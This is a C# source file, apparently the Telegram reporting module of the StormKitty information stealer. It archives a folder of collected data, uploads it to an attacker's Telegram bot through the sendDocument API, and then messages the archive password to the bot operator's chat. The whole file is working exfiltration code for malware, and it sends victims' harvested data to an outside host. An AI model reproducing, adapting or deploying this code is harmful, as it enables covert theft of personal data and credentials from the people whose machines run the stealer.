using StormKitty.Implant;
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;

namespace StormKitty.Telegram
{
    internal sealed class Report
    {
        private static string TelegramBotAPI = Config.TelegramAPI;

        private static string _currentZipPath;
        private static string _originalPath;

        public static void SendReport(string sourcePath)
        {
            try
            {
                _originalPath = sourcePath;

                if (!ValidateInputPath(ref sourcePath))
                {
                    Console.WriteLine("[!] Invalid input path");
                    return;
                }

                if (Path.HasExtension(sourcePath)) // Existing ZIP file
                {
                    _currentZipPath = sourcePath;
                    Console.WriteLine($"[1/3] Using existing archive: {_currentZipPath}");
                }
                else // Directory needs archiving
                {
                    Console.WriteLine($"[1/3] Creating archive from: {sourcePath}");
                    _currentZipPath = Filemanager.CreateArchive(sourcePath);
                    if (string.IsNullOrEmpty(_currentZipPath)) return;
                }

                Console.WriteLine($"[2/3] Uploading {Path.GetFileName(_currentZipPath)} " +
                                 $"({GetFileSizeMB(_currentZipPath)} MB)");
                int msgId = UploadToTelegram();

                Console.WriteLine("[3/3] Sending confirmation...");
                SendFinalReport(msgId);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Critical error: {ex.Message}");
            }
            finally
            {
                CleanupResources();
            }
        }

        private static bool ValidateInputPath(ref string path)
        {
            try
            {
                if (Directory.Exists(path)) return true;
                if (File.Exists(path) && path.EndsWith(".zip")) return true;

                // Try removing .zip extension
                if (path.EndsWith(".zip"))
                {
                    string dirPath = path.Substring(0, path.Length - 4);
                    if (Directory.Exists(dirPath))
                    {
                        path = dirPath;
                        return true;
                    }
                }

                Console.WriteLine($"[!] Path not found: {path}");
                return false;
            }
            catch
            {
                return false;
            }
        }

        private static int UploadToTelegram()
        {
            try
            {
                string boundary = "------------------------" + DateTime.Now.Ticks.ToString("x");
                byte[] fileBytes = File.ReadAllBytes(_currentZipPath);
                string fileName = Path.GetFileName(_currentZipPath);

                // Build multipart form data
                var formData = new StringBuilder();
                formData.AppendLine($"--{boundary}");
                formData.AppendLine($"Content-Disposition: form-data; name=\"chat_id\"");
                formData.AppendLine();
                formData.AppendLine(Config.TelegramID);
                formData.AppendLine($"--{boundary}");
                formData.AppendLine($"Content-Disposition: form-data; name=\"document\"; filename=\"{fileName}\"");
                formData.AppendLine("Content-Type: application/zip");
                formData.AppendLine();
                formData.AppendLine($"--{boundary}--");

                // Convert to byte array
                byte[] headerBytes = Encoding.UTF8.GetBytes(formData.ToString());
                byte[] footerBytes = Encoding.UTF8.GetBytes($"\r\n--{boundary}--\r\n");
                byte[] body = new byte[headerBytes.Length + fileBytes.Length + footerBytes.Length];

                Buffer.BlockCopy(headerBytes, 0, body, 0, headerBytes.Length);
                Buffer.BlockCopy(fileBytes, 0, body, headerBytes.Length, fileBytes.Length);
                Buffer.BlockCopy(footerBytes, 0, body, headerBytes.Length + fileBytes.Length, footerBytes.Length);

                // Send request
                using (var client = new EnhancedWebClient(60000))
                {
                    client.Headers.Add("Content-Type", $"multipart/form-data; boundary={boundary}");
                    byte[] response = client.UploadData(
                        $"https://api.telegram.org/bot{TelegramBotAPI}/sendDocument",
                        "POST",
                        body
                    );

                    string responseString = Encoding.UTF8.GetString(response);
                    Console.WriteLine($"Telegram response: {responseString}");
                    return GetMessageId(responseString);
                }
            }
            catch (WebException ex)
            {
                HandleWebException(ex);
                return -1;
            }
        }

        private static void SendFinalReport(int fileMsgId)
        {
            try
            {
                string sizeInfo = Path.HasExtension(_originalPath)
                    ? GetFileSizeMB(_currentZipPath) + " MB"
                    : Filemanager.DirectorySize(_originalPath) / 1024 + " KB";

                string message = $@"📁 Report Complete
🔐 Password: {StringsCrypt.ArchivePassword}
📦 Size: {sizeInfo}
📩 Message ID: {fileMsgId}";

                using (var client = new EnhancedWebClient(30000))
                {
                    client.UploadString(
                        $"https://api.telegram.org/bot{TelegramBotAPI}/sendMessage",
                        "POST",
                        $"chat_id={Config.TelegramID}&text={Uri.EscapeDataString(message)}"
                    );
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Final report failed: {ex.Message}");
            }
        }

        private class EnhancedWebClient : WebClient
        {
            private readonly int _timeout;
            public EnhancedWebClient(int timeout) => _timeout = timeout;

            protected override WebRequest GetWebRequest(Uri address)
            {
                var request = base.GetWebRequest(address);
                request.Timeout = _timeout;
                return request;
            }
        }

        private static int GetMessageId(string response)
        {
            var match = Regex.Match(response, @"""message_id"":(\d+)");
            return match.Success ? int.Parse(match.Groups[1].Value) : -1;
        }

        private static float GetFileSizeMB(string path)
        {
            return new FileInfo(path).Length / 1024f / 1024f;
        }

        private static void HandleWebException(WebException ex)
        {
            Console.WriteLine($"[!] Network error: {ex.Status}");
            if (ex.Response is HttpWebResponse response)
            {
                Console.WriteLine($"HTTP {response.StatusCode} ({response.StatusDescription})");
                using (var stream = response.GetResponseStream())
                using (var reader = new StreamReader(stream))
                {
                    Console.WriteLine($"Response body: {reader.ReadToEnd()}");
                }
            }
        }

        private static void CleanupResources()
        {
            try
            {
                // Only delete if we created the zip ourselves
                if (!_originalPath.EndsWith(".zip") && File.Exists(_currentZipPath))
                {
                    File.Delete(_currentZipPath);
                    Console.WriteLine("✅ Temporary files cleaned");
                }
            }
            catch
            {
                Console.WriteLine("⚠️ Partial cleanup - file might remain");
            }
        }
    }
}